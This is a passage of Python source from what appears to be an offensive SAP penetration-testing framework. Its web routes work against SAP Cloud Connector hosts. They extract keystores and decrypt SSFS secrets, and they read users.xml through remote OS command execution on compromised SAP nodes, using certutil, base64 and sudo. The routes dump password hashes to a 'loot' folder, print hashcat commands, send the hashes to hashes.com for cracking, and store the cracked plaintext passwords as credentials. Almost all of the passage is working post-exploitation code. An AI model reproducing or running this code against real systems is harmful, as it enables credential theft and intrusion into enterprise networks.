                                        {"ok": True,
                                         "secrets_path": sp,
                                         "secrets_keys": list(secrets.keys()),
                                         "keystores": [],
                                         "native_lib": "(pure-python/onhost)"})
                                    print(f"[+] SCC {host}: on-host SSFS: "
                                          f"{len(secrets)} secret(s) recovered")
                            else:
                                print(f"[*] SCC {host}: backup SSFS gave 0 "
                                      f"secrets. Use 'Decrypt On-Host SSFS' "
                                      f"from a co-located pwned SAP node to "
                                      f"read the unencrypted on-host files.")
                    except Exception as de:
                        print(f"[-] SCC {host}: auto SSFS decrypt failed: {de}")
                        sapmap_findings.emit_finding(
                            "INFO", host,
                            f"SCC SSFS auto-decrypt error: {de}",
                            ref="scc.ssfs.decrypt.error",
                            meta={"error": str(de)})
            except Exception as e:
                print(f"[-] SCC {host}: keystore extract failed: {e}")
                sapmap_findings.emit_finding(
                    "INFO", host,
                    f"SCC keystore extraction error: {e}",
                    ref="scc.keystore.extract.error",
                    meta={"error": str(e)})
            finally:
                _task_end(f"scc:{host}:extract_keystore")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/scc/<host>/probe_mappings", method="POST")
    def scc_probe_mappings(host):
        """Tunnel-relay smoke test: TCP/HTTP probe every mapping's
        internal endpoint to confirm the on-prem backend is actually
        reachable from this network.  No credentials are sent."""
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        if not sn.mappings:
            return json.dumps({"error": "no mappings on this SCC — pull them first"})

        def _run():
            _task_start(f"scc:{host}:probe_mappings",
                        f"SCC {host}: probing {len(sn.mappings)} mapping(s)")
            try:
                from sapmap_scc_relay import probe_mapping
                ok_n = 0
                fail_n = 0
                for m in sn.mappings:
                    if not isinstance(m, dict):
                        continue
                    res = probe_mapping(m, timeout=4.0)
                    label = (f"{m.get('virtual_host','?')}:{m.get('virtual_port',0)}"
                             f" -> {m.get('internal_host','?')}:{m.get('internal_port',0)}")
                    sid_label = m.get("sid") or "?"
                    proto = (m.get("protocol") or "").upper() or "TCP"
                    if res["reachable"]:
                        ok_n += 1
                        sapmap_findings.emit_finding(
                            "INFO", host,
                            f"SCC mapping reachable: {label} [{sid_label}/{proto}]"
                            f" — {res['probe_latency_ms']}ms"
                            f"{(' · ' + res['probe_signature']) if res['probe_signature'] else ''}",
                            ref="scc.mapping.reachable",
                            meta={"mapping": label, "sid": sid_label,
                                  "protocol": proto,
                                  "latency_ms": res["probe_latency_ms"],
                                  "signature": res["probe_signature"]})
                    else:
                        fail_n += 1
                        sapmap_findings.emit_finding(
                            "MEDIUM", host,
                            f"SCC mapping UNREACHABLE: {label} [{sid_label}/{proto}]"
                            f" — {res['probe_error']}.  Tunnel would 502 on cloud-side requests.",
                            ref="scc.mapping.unreachable",
                            meta={"mapping": label, "sid": sid_label,
                                  "protocol": proto,
                                  "error": res["probe_error"]})
                sapmap_findings.emit_finding(
                    "INFO", host,
                    f"SCC tunnel-relay smoke test complete: "
                    f"{ok_n} reachable, {fail_n} unreachable "
                    f"(of {len(sn.mappings)} mapping(s)).",
                    ref="scc.mapping.probe.summary",
                    meta={"reachable": ok_n, "unreachable": fail_n,
                          "total": len(sn.mappings)})
            except Exception as e:
                print(f"[-] SCC {host}: mapping probe failed: {e}")
            finally:
                _task_end(f"scc:{host}:probe_mappings")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started", "count": len(sn.mappings)})

    @app.route("/api/scc/<host>/analyse_pp", method="POST")
    def scc_analyse_pp(host):
        """Re-run the principal-propagation analyser against the most
        recent backup zip for this SCC.  Auto-runs after Extract
        Keystore; this route lets the operator re-analyse on demand
        (e.g. after editing the ini file out-of-band) without re-
        pulling the whole backup."""
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        if not sn.keystore_loot_path or not os.path.isfile(sn.keystore_loot_path):
            return json.dumps({"error": "no loot zip on this SCC — run "
                                          "Extract Keystore first"})

        def _run():
            _task_start(f"scc:{host}:analyse_pp",
                        f"SCC {host}: PP analyser")
            try:
                from sapmap_scc_keystore import (
                    parse_pp_config_from_zip, parse_pp_trust_from_zip,
                )
                from sapmap_scc_pp_analyzer import analyze_backup
                pp = parse_pp_config_from_zip(sn.keystore_loot_path)
                trust = parse_pp_trust_from_zip(sn.keystore_loot_path)
                bundle = analyze_backup(pp, trust, mappings=sn.mappings)
                sn.pp_analysis = bundle
                sn.pp_analysis_at = bundle.get("analyzed_at", "")
                crit = bundle["summary"].get("critical", 0)
                high = bundle["summary"].get("high", 0)
                sn.pp_weak_count = crit + high
                for f in bundle["findings"]:
                    sapmap_findings.emit_finding(
                        f["severity"], host,
                        f["headline"]
                        + " — "
                        + f.get("recommendation", ""),
                        ref=f["ref"],
                        meta={"why": f.get("why", []),
                              "raw": f.get("raw", {})})
                print(f"[+] SCC {host}: PP analyser re-run — "
                      f"{crit} CRITICAL, {high} HIGH, "
                      f"{bundle['summary'].get('medium', 0)} MEDIUM")
            except Exception as e:
                print(f"[-] SCC {host}: analyse_pp failed: {e}")
            finally:
                _task_end(f"scc:{host}:analyse_pp")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/scc/<host>/decrypt_ssfs", method="POST")
    def scc_decrypt_ssfs(host):
        """Decrypt SSFS_SCC inside the loot zip using the SAP-shipped JNI
        helper, then unlock every .p12 with the recovered keystore password.
        Persists plaintext SSFS values to a side file at mode 0600 — only
        the key NAMES are surfaced via findings/drawer."""
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        if not sn.keystore_loot_path or not os.path.isfile(sn.keystore_loot_path):
            return json.dumps({"error": "no loot zip on this SCC — run "
                                          "Extract Keystore first"})
        data = request.json or {}
        scc_native_dir = data.get("scc_native_dir", "") or data.get("scc_native_lib", "")
        helper_jar = data.get("helper_jar", "") or None
        java_bin = data.get("java_bin", "") or "java"
        sid = data.get("sid", "") or "SCC"
        timeout = float(data.get("timeout", 30.0))

        def _run():
            _task_start(f"scc:{host}:decrypt_ssfs",
                        f"SCC {host}: decrypting SSFS + unlocking keystores")
            try:
                from sapmap_scc_ssfs_decrypt import decrypt_and_unlock
                res = decrypt_and_unlock(
                    sn.keystore_loot_path,
                    scc_native_lib=scc_native_dir or None,
                    helper_jar=helper_jar,
                    java_bin=java_bin,
                    sid=sid,
                    timeout=timeout,
                )
                _apply_ssfs_decrypt_result(host, sn, res)
            except Exception as e:
                print(f"[-] SCC {host}: SSFS decrypt failed: {e}")
                sapmap_findings.emit_finding(
                    "INFO", host,
                    f"SCC SSFS decryption error: {e}",
                    ref="scc.ssfs.decrypt.error",
                    meta={"error": str(e)})
            finally:
                _task_end(f"scc:{host}:decrypt_ssfs")
        threading.Thread(target=_run, daemon=True).start()
        return json.dumps({"status": "started"})

    @app.route("/api/scc/<host>/set_credentials", method="POST")
    def scc_set_credentials(host):
        """Store credentials for an SCC node so pull-mappings and
        extract-keystore can auto-fill without prompting again."""
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        data = request.json or {}
        user = data.get("username", "").strip()
        pwd = data.get("password", "")
        if not user or not pwd:
            return json.dumps({"error": "username and password are required"})
        from sapmap_models import Credentials as _Creds
        sn.credentials = [_Creds(username=user, password=pwd, verified=False)]
        print(f"[*] SCC {host}: credentials stored for {user}")
        return json.dumps({"ok": True})

    @app.route("/api/scc/<host>/download_user_hashes", method="POST")
    def scc_download_user_hashes(host):
        """Read SCC users.xml and return parsed password hashes + hashcat
        instructions.

        Resolution order:
          1. On-disk via a co-located pwned SAP node (OS exec)
          2. From the backup zip already on disk (if not zip-encrypted)
          3. REST API /api/v1/users (user list only — no hashes; shown as
             fallback so the operator at least sees who's there)
        """
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})

        import re as _re
        xml_bytes = None
        xml_source = ""
        # All identifiers we consider "this SCC host"
        scc_addrs = {a.lower() for a in [sn.ip, sn.host, host] if a}
        print(f"[*] SCC {host}: download_user_hashes — "
              f"scc_addrs={scc_addrs}")

        # --- Path 0: cached plaintext from previous extraction ----------
        if not xml_bytes and sn.users_xml_loot_path:
            try:
                with open(sn.users_xml_loot_path, "rb") as fh:
                    raw = fh.read()
                if raw[:1] in (b"<", b"\xef"):
                    xml_bytes = raw
                    xml_source = f"cached plaintext ({sn.users_xml_loot_path})"
                    print(f"[+] SCC {host}: users.xml from cache "
                          f"({len(xml_bytes)} bytes)")
            except Exception as e:
                print(f"[-] SCC {host}: cache read error: {e}")
                sn.users_xml_loot_path = ""  # clear stale path

        # --- Path 1: co-located pwned SAP node ---------------------------
        for n in api.state.nodes.values():
            # Flexible match: any of ip/hostname must match any SCC addr
            node_addrs = {a.lower() for a in [n.ip or "", n.hostname or ""] if a}
            if not node_addrs & scc_addrs:
                print(f"[*] SCC {host}: Path 1 skip {n.sid} — "
                      f"addrs {node_addrs} ∩ {scc_addrs} = ∅")
                continue
            has_exec = (n.gw_vulnerable or n.cve_2025_31324_vulnerable
                        or bool(n.created_users))
            if not has_exec:
                print(f"[*] SCC {host}: Path 1 skip {n.sid} — "
                      f"no OS-exec (gw={n.gw_vulnerable}, "
                      f"cve31324={n.cve_2025_31324_vulnerable}, "
                      f"created_users={bool(n.created_users)})")
                continue
            print(f"[*] SCC {host}: Path 1 — trying OS-exec via {n.sid}")
            try:
                # Use execute_gw_command directly with long_params="" to
                # prevent the default PARAMS-mirroring into LONG_PARAMS.
                # With long_params=None (run_os_command default), the kernel
                # concatenates PARAMS+LONG_PARAMS, turning "cat /path" into
                # "cat /path /path" and returning the file content twice.
                from sapmap_exploit import execute_os_command as execute_gw_command
                is_win = "windows" in (n.os_type or "").lower() or \
                         "nt" in (n.os_type or "").lower()
                def _gw(prog, arg):
                    r = execute_gw_command(n, prog, arg, long_params="")
                    return "\n".join(r.get("output") or []).strip(), r.get("success", False)

                # Linux paths use ls + base64; Windows uses dir + certutil
                if is_win:
                    # Enumerate every mounted drive so SCC installs on
                    # non-default drives (P:, D:, …) are also found.
                    drives = _enumerate_windows_drives(_gw)
                    print(f"[*] SCC {host}: Windows drives: "
                          f"{', '.join(drives)}")
                    win_roots = _expand_scc_roots_across_drives(drives)
                    fpath = None
                    for root in win_roots:
                        candidate = rf"{root}\config\users.xml"
                        dir_out, _ = _gw("cmd.exe",
                                         f"/c if exist \"{candidate}\" echo FOUND")
                        print(f"[*] SCC {host}: probe {candidate} → "
                              f"{dir_out[:40]!r}")
                        if "FOUND" in dir_out:
                            fpath = candidate
                            print(f"[*] SCC {host}: found {candidate} on Windows")
                            break
                    # Fallback: dir /s /b glob across <drive>:\SAP\scc*
                    # AND <drive>:\usr\scc* on every detected drive.
                    if not fpath:
                        for d in drives:
                            for top in (r"SAP", r"usr"):
                                glob_out, _ = _gw(
                                    "cmd.exe",
                                    rf"/c dir /s /b {d}\{top}\scc*\config\users.xml 2>nul")
                                for line in glob_out.splitlines():
                                    line = line.strip()
                                    if line.lower().endswith("users.xml"):
                                        fpath = line
                                        print(f"[*] SCC {host}: glob found {fpath} "
                                              f"on {d}\\{top}")
                                        break
                                if fpath:
                                    break
                            if fpath:
                                break
                    if not fpath:
                        print(f"[-] SCC {host}: users.xml not found via "
                              f"{n.sid} on Windows (drives tried: "
                              f"{', '.join(drives)})")
                        continue
                    # SAPXPG has a ~128-byte per-line output limit AND a
                    # PARAMS length limit.  Long PowerShell commands get
                    # truncated before they run; raw XML has long lines that
                    # get cut off.
                    #
                    # Fix: use PowerShell to parse the XML and emit one short
                    # pipe-delimited line per user (always < 128 bytes).
                    # Then reconstruct XML-like objects on the Python side.
                    #
                    # Command kept short enough to fit in SAPXPG PARAMS:
                    # Use Select-String (findstr equivalent) to extract
                    # the username and password attributes directly —
                    # no PowerShell XML parsing, no quoting issues.
                    # Each attribute is on its own short output line.
                    # Read the file via certutil base64.  SAPXPG truncates
                    # each output line at ~128 bytes — Tomcat saves users.xml
                    # as one long line with every <user> element concatenated,
                    # so a findstr match returns one line and SAPXPG drops
                    # everything past ~128 chars (i.e. the first user).
                    #
                    # Use the same single-cmd chained pattern the SSFS reader
                    # uses successfully: certutil -encode writes a base64 file,
                    # `type` dumps it, `del` cleans up — all chained with &&
                    # inside ONE cmd /c invocation so we get every output row
                    # from `type` in the same SAPXPG LOG table.  Two separate
                    # SAPXPG calls (one for certutil, one for `more`) lose
                    # everything past the first ~2 rows on kernels that
                    # don't honour MXROW.
                    import re as _re2
                    import base64 as _b64e
                    raw = None
                    tmp = r"%TEMP%\.scc_users.b64"
                    chained = (
                        f'/c certutil -encode "{fpath}" "{tmp}" && '
                        f'type "{tmp}" && del "{tmp}"'
                    )
                    cu_out, _ = _gw("cmd.exe", chained)
                    # Filter out certutil status lines + PEM markers, then
                    # strip every non-base64 char from the remainder.
                    b64_lines = []
                    for line in (cu_out or "").splitlines():
                        clean = line.strip()
                        if not clean:
                            continue
                        if clean.startswith("-----"):
                            continue   # PEM BEGIN/END CERTIFICATE markers
                        if ("CertUtil" in clean or "Input Length" in clean
                                or "Output Length" in clean):
                            continue   # certutil progress output
                        kept = "".join(
                            c for c in clean
                            if c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                    "abcdefghijklmnopqrstuvwxyz0123456789+/=")
                        if kept:
                            b64_lines.append(kept)
                    b64_text = "".join(b64_lines)
                    print(f"[*] SCC {host}: certutil base64 → "
                          f"{len(cu_out)}B raw, {len(b64_text)} b64 chars "
                          f"({len(b64_lines)} lines)")
                    if len(b64_text) >= 16:
                        try:
                            raw = _b64e.b64decode(b64_text)
                            print(f"[*] SCC {host}: decoded users.xml "
                                  f"({len(raw)} bytes)")
                        except Exception as _de:
                            print(f"[-] SCC {host}: base64 decode failed: {_de}")
                            raw = None
                    if not raw:
                        print(f"[-] SCC {host}: certutil read returned no data — "
                              f"falling back to findstr (limited to 1st user)")
                        # Last-ditch fallback for cases where certutil isn't
                        # present.  Retains the multi-element parsing so if
                        # SAPXPG happens NOT to truncate (e.g. tiny files),
                        # we still extract every <user> element.
                        findstr_out, _ = _gw(
                            "cmd.exe",
                            f'/c findstr /i "username= password= roles=" "{fpath}"')
                        print(f"[*] SCC {host}: findstr fallback → "
                              f"{len(findstr_out)}B out={findstr_out[:120]!r}")
                        xml_parts = [
                            b'<?xml version="1.0" encoding="utf-8"?>',
                            b'<tomcat-users>',
                        ]
                        found_users = 0
                        user_re = _re2.compile(r'<user\b([^/>]*)/?\s*>',
                                                _re2.IGNORECASE)
                        attr_re = _re2.compile(
                            r'(\w+)\s*=\s*["\']([^"\']*)["\']',
                            _re2.IGNORECASE)
                        for m in user_re.finditer(findstr_out):
                            attrs = {k.lower(): v
                                      for k, v in attr_re.findall(m.group(1))}
                            uname = attrs.get("username", "")
                            pwd   = attrs.get("password", "")
                            roles = attrs.get("roles", "")
                            if uname:
                                xml_parts.append(
                                    f'  <user username="{uname}" '
                                    f'password="{pwd}" '
                                    f'roles="{roles}"/>'.encode())
                                found_users += 1
                        xml_parts.append(b'</tomcat-users>')
                        if found_users > 0:
                            raw = b"\n".join(xml_parts)
                            print(f"[*] SCC {host}: findstr-fallback parsed "
                                  f"{found_users} user(s)")
                else:
                    linux_roots = [
                        "/opt/sap/scc",
                        "/usr/local/scc",
                        "/opt/sapscc",
                        "/opt/cloud-connector",
                        "/opt/SAP/cloud-connector",
                    ]
                    fpath = None
                    for root in linux_roots:
                        candidate = f"{root}/config/users.xml"
                        ls_out, _ = _gw("ls", candidate)
                        ls_ok = ls_out.startswith(candidate) and \
                                "Permission denied" not in ls_out and \
                                "No such file" not in ls_out
                        print(f"[*] SCC {host}: ls {candidate} → "
                              f"ok={ls_ok} out={ls_out[:60]!r}")
                        if ls_ok or "Permission denied" in ls_out:
                            fpath = candidate
                            if "Permission denied" in ls_out:
                                print(f"[*] SCC {host}: ls permission denied — "
                                      f"will try base64 anyway")
                            break
                    if not fpath:
                        print(f"[-] SCC {host}: users.xml not found via "
                              f"{n.sid} (checked {len(linux_roots)} paths)")
                        continue

                    # Read via base64 to avoid SAPXPG 128-byte line limit
                    import base64 as _b64e
                    def _read_via_base64(prog, arg):
                        out, ok = _gw(prog, arg)
                        if not ok or "Permission denied" in out:
                            return None, out
                        b64 = out.replace("\n", "").replace("\r", "").strip()
                        try:
                            return _b64e.b64decode(b64), ""
                        except Exception as e:
                            return None, f"base64 decode error: {e}"

                    raw, err = _read_via_base64("base64", fpath)
                    print(f"[*] SCC {host}: base64 read → "
                          f"{len(raw) if raw else 0}B err={err[:60]!r}")
                    if raw is None and "Permission denied" in err:
                        print(f"[*] SCC {host}: permission denied — "
                              f"trying sudo base64")
                        raw, err = _read_via_base64("sudo", f"base64 {fpath}")
                        print(f"[*] SCC {host}: sudo base64 → "
                              f"{len(raw) if raw else 0}B err={err[:60]!r}")

                if raw and raw.strip().startswith(b"<"):
                    xml_bytes = raw
                    xml_source = f"on-disk via {n.sid} OS-exec ({fpath})"
                    print(f"[+] SCC {host}: users.xml read via {n.sid} "
                          f"({len(xml_bytes)} bytes)")
                    break
                else:
                    print(f"[-] SCC {host}: could not read {fpath} — "
                          f"raw={raw[:20] if raw else None!r}")
            except Exception as e:
                print(f"[-] SCC {host}: OS-exec Path 1 error: {e}")

        # --- Path 2: backup zip on disk ----------------------------------
        if not xml_bytes:
            zip_path = sn.keystore_loot_path or ""
            if zip_path:
                print(f"[*] SCC {host}: Path 2 — checking backup zip "
                      f"{zip_path}")
                try:
                    import zipfile as _zf
                    zf = _zf.ZipFile(zip_path)
                    members = zf.namelist()
                    if "config/users.xml" in members:
                        raw = zf.read("config/users.xml")
                        print(f"[*] SCC {host}: users.xml in zip — "
                              f"{len(raw)} bytes, first byte={raw[:1]!r}")
                        if raw[:1] in (b"<", b"\xef"):
                            xml_bytes = raw
                            xml_source = f"backup zip ({zip_path})"
                            print(f"[+] SCC {host}: users.xml from zip "
                                  f"({len(xml_bytes)} bytes)")
                        else:
                            print(f"[-] SCC {host}: users.xml in zip is "
                                  f"binary/encrypted — backup password "
                                  f"required to decrypt (SCC encrypts it "
                                  f"inside the zip)")
                    else:
                        print(f"[-] SCC {host}: config/users.xml not in "
                              f"zip (members: {members[:8]})")
                except Exception as e:
                    print(f"[-] SCC {host}: Path 2 zip error: {e}")
            else:
                print(f"[*] SCC {host}: Path 2 — no backup zip on record "
                      f"(run Extract Keystore first)")

        # --- Path 3: REST API user listing (no hashes) -------------------
        if not xml_bytes:
            print(f"[*] SCC {host}: Path 3 — REST API fallback")
            creds = sn.credentials[0] if sn.credentials else None
            if creds:
                try:
                    from sapmap_scc_admin import login, logout, _basic_headers
                    import urllib.request as _urlreq
                    u = getattr(creds, "username", None) or (
                        creds.get("username","") if isinstance(creds,dict) else "")
                    p = getattr(creds, "password", None) or (
                        creds.get("password","") if isinstance(creds,dict) else "")
                    print(f"[*] SCC {host}: REST login as {u!r}")
                    sess = login(host, u, p, port=sn.admin_ui_port or 8443)
                    if sess and sess.authenticated:
                        url = f"{sess.base_url}/api/v1/users"
                        req = _urlreq.Request(url, headers=_basic_headers(sess))
                        with sess.opener.open(req, timeout=8) as resp:
                            body = resp.read().decode("utf-8", errors="replace")
                        logout(sess)
                        print(f"[*] SCC {host}: REST /api/v1/users "
                              f"({len(body)} bytes): {body[:100]!r}")
                        import json as _j2
                        rest_users = _j2.loads(body) if body.startswith("[") else []
                        if rest_users:
                            sapmap_findings.emit_finding(
                                "INFO", host,
                                f"SCC users enumerated via REST (no hashes): "
                                f"{[u.get('name') for u in rest_users]}",
                                ref="scc.users.rest_listed",
                                meta={"users": rest_users})
                            return json.dumps({
                                "ok": True,
                                "source": "REST API (user list only — no hashes; filesystem access needed)",
                                "users": rest_users,
                                "hashes": [],
                                "hashcat_commands": [],
                            })
                    else:
                        print(f"[-] SCC {host}: REST login failed")
                except Exception as e:
                    print(f"[-] SCC {host}: Path 3 REST error: {e}")
            else:
                print(f"[-] SCC {host}: Path 3 — no stored credentials "
                      f"(use Set Credentials on this SCC node)")
            diag = (f"users.xml not reachable on SCC {host}. "
                    f"scc_addrs={scc_addrs}. "
                    f"Tried: Path1=OS-exec via co-located SAP node "
                    f"(gw_vulnerable/cve31324/created_users required); "
                    f"Path2=backup zip ({sn.keystore_loot_path or 'none'}); "
                    f"Path3=REST API ({'creds present' if creds else 'no creds'}). "
                    f"Check terminal for details.")
            print(f"[-] SCC {host}: all paths failed — {diag}")
            return json.dumps({"ok": False, "error": diag})

        # --- Parse XML ---------------------------------------------------
        print(f"[*] SCC {host}: parsing {len(xml_bytes)}B of XML")
        # Save raw users.xml to loot regardless of parse outcome
        try:
            host_slug = host.replace(":", "_").replace("/", "_")
            loot_dir = os.path.join("loot", "scc", host_slug)
            os.makedirs(loot_dir, exist_ok=True)
            users_xml_path = os.path.join(loot_dir, "users.xml")
            with open(users_xml_path, "wb") as _fh:
                _fh.write(xml_bytes)
            os.chmod(users_xml_path, 0o600)
            sn.users_xml_loot_path = users_xml_path
            print(f"[+] SCC {host}: users.xml saved to {users_xml_path}")
        except Exception as _le:
            print(f"[-] SCC {host}: could not save users.xml to loot: {_le}")
        from sapmap_scc_keystore import parse_user_hashes_from_xml
        result = parse_user_hashes_from_xml(xml_bytes)
        if not result.get("ok"):
            print(f"[-] SCC {host}: XML parse failed: {result.get('error')}")
            return json.dumps(result)
        users = result["users"]
        hashcat_cmds = result["hashcat_commands"]
        for u in users:
            if u.get("hash_hex"):
                sapmap_findings.emit_finding(
                    "HIGH", host,
                    f"SCC password hash recovered for '{u['username']}' "
                    f"({u.get('algorithm','?')}, "
                    f"roles={u.get('roles','?')}) — "
                    f"hashcat -m {u.get('hashcat_mode',0)} hash:salt, "
                    f"or paste hash into https://crackstation.net for "
                    f"instant rainbow-table lookup.",
                    ref="scc.users.hash_recovered",
                    meta={"username": u["username"],
                          "algorithm": u.get("algorithm"),
                          "hashcat_mode": u.get("hashcat_mode"),
                          "roles": u.get("roles")},
                    attack_capability="creds.user_password_hash")
            else:
                sapmap_findings.emit_finding(
                    "INFO", host,
                    f"SCC user '{u['username']}' found in users.xml "
                    f"(no hash parsed).",
                    ref="scc.users.no_hash",
                    meta={"username": u["username"]})
        # Write hashcat-ready hash file(s) to loot
        try:
            from collections import defaultdict as _dd
            by_mode = _dd(list)
            for u in users:
                if u.get("hashcat_line") and u.get("hashcat_mode"):
                    by_mode[u["hashcat_mode"]].append(
                        f"# {u['username']} ({u.get('algorithm','?')})\n"
                        f"{u['hashcat_line']}")
            for mode, lines in by_mode.items():
                hc_path = os.path.join(loot_dir, f"hashes_m{mode}.txt")
                with open(hc_path, "w") as _fh:
                    _fh.write("\n".join(lines) + "\n")
                os.chmod(hc_path, 0o600)
                print(f"[+] SCC {host}: hashcat hashes (-m {mode}) → "
                      f"{hc_path}")
        except Exception as _he:
            print(f"[-] SCC {host}: could not save hashcat file: {_he}")
        return json.dumps({
            "ok": True,
            "source": xml_source,
            "users": users,
            "hashcat_commands": hashcat_cmds,
            "loot_path": users_xml_path if "users_xml_path" in dir() else "",
        })

    # -- Local settings (API keys etc, stored in settings.local.json) --
    def _get_local_setting(key: str) -> str:
        try:
            with open("settings.local.json") as f:
                return json.load(f).get(key, "")
        except Exception:
            return ""

    @app.route("/api/settings/local", method="GET")
    def get_local_settings():
        """Return non-sensitive local settings (API keys etc)."""
        response.content_type = "application/json"
        try:
            with open("settings.local.json") as f:
                data = json.load(f)
        except Exception:
            data = {}
        # Only expose key existence, not the actual key value
        return json.dumps({
            "hashes_com_api_key_set": bool(data.get("hashes_com_api_key"))
        })

    @app.route("/api/settings/local", method="POST")
    def save_local_settings():
        """Save local settings to settings.local.json (gitignored)."""
        response.content_type = "application/json"
        data = request.json or {}
        try:
            try:
                with open("settings.local.json") as f:
                    existing = json.load(f)
            except Exception:
                existing = {}
            if "hashes_com_api_key" in data:
                existing["hashes_com_api_key"] = data["hashes_com_api_key"]
            with open("settings.local.json", "w") as f:
                json.dump(existing, f, indent=2)
            os.chmod("settings.local.json", 0o600)
            return json.dumps({"ok": True})
        except Exception as e:
            return json.dumps({"ok": False, "error": str(e)})

    @app.route("/api/scc/<host>/lookup_hashes_online", method="POST")
    def scc_lookup_hashes_online(host):
        """Look up SCC password hashes against hashes.com rainbow tables.

        Calls POST https://hashes.com/en/api/search with the hashes.
        When plaintext is found, stores it as an SCC credential.
        """
        response.content_type = "application/json"
        sn = api.state.scc_nodes.get(host)
        if not sn:
            return json.dumps({"error": f"SCC node {host} not found"})
        data = request.json or {}
        api_key = data.get("api_key") or _get_local_setting("hashes_com_api_key")
        if not api_key:
            return json.dumps({"error": "No hashes.com API key — set it in Settings"})
        hashes_input = data.get("hashes") or []
        # Script path: no modal, no hashes in payload — re-parse from cached users.xml
        if not hashes_input and sn.users_xml_loot_path:
            try:
                from sapmap_scc_keystore import parse_user_hashes_from_xml
                with open(sn.users_xml_loot_path, "rb") as _fh:
                    _xml = _fh.read()
                _parsed = parse_user_hashes_from_xml(_xml)
                hashes_input = [
                    {"username": u["username"],
                     "hash_hex": u["hash_hex"],
                     "algorithm": u.get("algorithm", ""),
                     "hashcat_line": u.get("hashcat_line", "")}
                    for u in (_parsed.get("users") or [])
                    if u.get("hash_hex")
                ]
                print(f"[*] SCC {host}: lookup_hashes — loaded "
                      f"{len(hashes_input)} hash(es) from cached users.xml")
            except Exception as _he:
                print(f"[-] SCC {host}: lookup_hashes — cache load error: {_he}")
        if not hashes_input:
            return json.dumps({"error": "No hashes provided — run scc_download_hashes first"})

        import urllib.request as _urlreq2
        import urllib.parse as _urlparse

        # Build POST body: hashes[] array.
        # hashes.com expects raw hex hashes (no {SHA} prefix).  Multiple
        # SCC users frequently share the same hash (default vendor accounts
        # like SCC_Support / SCC_Display / SCC_Mon all ship with the same
        # password), so we de-duplicate the POST payload by hash and keep
        # a hex -> [user, ...] map to fan results back out to every user
        # sharing that hash.
        post_params = [("key", api_key)]
        hash_map = {}  # hex -> list[{username, algorithm, ...}]
        for h in hashes_input:
            hex_hash = h.get("hash_hex", "").strip().lower()
            if not hex_hash or len(hex_hash) < 8:
                continue
            if hex_hash not in hash_map:
                # First time seeing this hash → submit it to hashes.com
                post_params.append(("hashes[]", hex_hash))
                hash_map[hex_hash] = []
            hash_map[hex_hash].append(h)

        if not hash_map:
            return json.dumps({"error": "No valid hex hashes to look up"})

        unique_count = len(hash_map)
        users_count = sum(len(v) for v in hash_map.values())
        if unique_count != users_count:
            print(f"[*] SCC {host}: lookup_hashes — {users_count} user(s) "
                  f"share {unique_count} unique hash(es); deduped POST")

        try:
            body = _urlparse.urlencode(post_params).encode()
            req = _urlreq2.Request(
                "https://hashes.com/en/api/search",
                data=body,
                method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "SAPMAP/1.0"}
            )
            import ssl as _ssl2
            ctx = _ssl2.create_default_context()
            with _urlreq2.urlopen(req, timeout=15, context=ctx) as r:
                resp_body = r.read().decode("utf-8", errors="replace")
            resp = json.loads(resp_body)
        except Exception as e:
            return json.dumps({"error": f"hashes.com API error: {e}"})

        if not resp.get("success"):
            return json.dumps({"error": f"hashes.com: {resp.get('message', 'unknown error')}"})

        # API returns {founds: [...], unfounds: [...]} not {list: [...]}.
        # Fan results out to every user sharing each hash so the modal
        # shows ALL N users (not just the last one we mapped per hash).
        from sapmap_models import Credentials as _Creds
        results = []
        cracked_count = 0
        host_slug = host.replace(":", "_").replace("/", "_")
        loot_dir = os.path.join("loot", "scc", host_slug)

        for item in (resp.get("founds") or []):
            hex_hash = (item.get("hash") or "").lower()
            plaintext = item.get("plaintext", "")
            users_for_hash = hash_map.get(hex_hash, [])
            if not users_for_hash:
                continue
            for original in users_for_hash:
                username = original.get("username", "?")
                results.append({
                    "username": username,
                    "hash_hex": hex_hash,
                    "found": True,
                    "plaintext": plaintext,
                    "algorithm": item.get("algorithm",
                                          original.get("algorithm", "")),
                })
                if not plaintext:
                    continue
                cracked_count += 1
                # Store as SCC credential.  When several users share the
                # same plaintext we keep them all in sn.credentials so
                # subsequent operations (Pull Mappings / Extract Keystore)
                # can pick whichever username is appropriate; best_credentials()
                # just uses the first.
                new_cred = _Creds(username=username, password=plaintext,
                                  verified=False)
                if not any(c.username == username and c.password == plaintext
                           for c in (sn.credentials or [])):
                    sn.credentials.append(new_cred)
                sn.pwned = True
                print(f"[+] SCC {host}: hashes.com cracked {username} → "
                      f"password stored as credential, node marked pwned")
                sapmap_findings.emit_finding(
                    "CRITICAL", host,
                    f"SCC password cracked for '{username}' via hashes.com "
                    f"rainbow table — plaintext stored as SCC credential. "
                    f"Use 'Pull Mappings' or 'Extract Keystore' without "
                    f"re-entering password.",
                    ref="scc.users.password_cracked",
                    meta={"username": username,
                          "algorithm": item.get("algorithm", ""),
                          "source": "hashes.com"})
                # Also append to loot file (one line per user)
                try:
                    os.makedirs(loot_dir, exist_ok=True)
                    cracked_path = os.path.join(loot_dir, "hashes_cracked.txt")
                    with open(cracked_path, "a") as fh:
                        fh.write(f"{username}:{plaintext}\n")
                    os.chmod(cracked_path, 0o600)
                except Exception:
                    pass

        for item in (resp.get("unfounds") or []):
            hex_hash = (item.get("hash") or "").lower()
            users_for_hash = hash_map.get(hex_hash, [])
            for original in users_for_hash:
                results.append({
                    "username": original.get("username", "?"),
                    "hash_hex": hex_hash,
                    "found": False,
                    "plaintext": "",
                    "algorithm": original.get("algorithm", ""),
                })

        cost = resp.get("cost", 0)
        total = len(results)
